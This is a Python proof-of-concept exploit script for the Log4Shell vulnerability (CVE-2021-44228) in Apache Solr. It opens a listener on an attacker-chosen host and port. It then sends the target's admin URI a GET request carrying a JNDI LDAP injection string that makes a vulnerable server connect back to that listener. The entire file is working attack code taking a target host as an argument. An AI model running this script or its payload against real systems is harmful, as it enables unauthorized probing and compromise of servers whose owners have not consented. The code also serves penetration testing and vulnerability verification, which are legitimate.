import argparse
import socket
import threading
from http.client import HTTPConnection


def parse_arguments():
    parser = argparse.ArgumentParser(
        description="POC for log4shell (CVE-2021-44228) for vulnerable Apache Solr instances.")
    parser.add_argument("LHOST", type=str, help="The local IP address for the payload")
    parser.add_argument("LPORT", type=int, help="The listening port number")
    parser.add_argument("LISTEN_HOST", type=str, help="The listening IP address")
    parser.add_argument("RHOST", type=str, help="The target host (hostname or IP) for the HTTP request")
    parser.add_argument("RPORT", type=int, help="The target port number for the HTTP request")
    parser.add_argument("TARGETURI", type=str, help="The uri of the SOLR Admin application")
    parser.add_argument("TIMEOUT", type=int, help="The timeout in seconds before the listener terminates")
    args = parser.parse_args()
    return args


def start_listener(lhost, lport, timeout):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        try:
            s.bind((lhost, lport))
        except Exception:
            print(f"Error: Unable to bind listener to {lhost}:{lport}")
            return
        s.listen(1)
        print(f"Listening on {lhost}:{lport} with {timeout}s timeout")

        try:
            conn, addr = s.accept()
        except socket.timeout:
            print(f"Listener timed out after {timeout} seconds")
            return

        with conn:
            print(f"Got connection from {addr[0]}:{addr[1]}!")
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                print(f"Received data: {data}")
                conn.sendall(data)
    print(f"Listener terminated.")


def send_http_request(host, port, path, lhost, lport):
    try:
        conn = HTTPConnection(host, port)
        path = f"{path}?action=${{jndi:ldap://{lhost}:{lport}}}"
        conn.request("GET", path)
        response = conn.getresponse()
        print(f"HTTP request to {host}:{port}{path} - Status: {response.status}, Reason: {response.reason}")
        return True
    except Exception as e:
        print(f"Error: Cannot connect to {host}:{port}: {e}")


def main():
    try:
        args = parse_arguments()
        listener_thread = threading.Thread(target=start_listener, args=(args.LISTEN_HOST, args.LPORT, args.TIMEOUT))
        listener_thread.start()
        send_http_request(host=args.RHOST, port=args.RPORT, path=args.TARGETURI, lhost=args.LHOST, lport=args.LPORT)
        listener_thread.join()
    except Exception as e:
        exit(e)


if __name__ == "__main__":
    main()
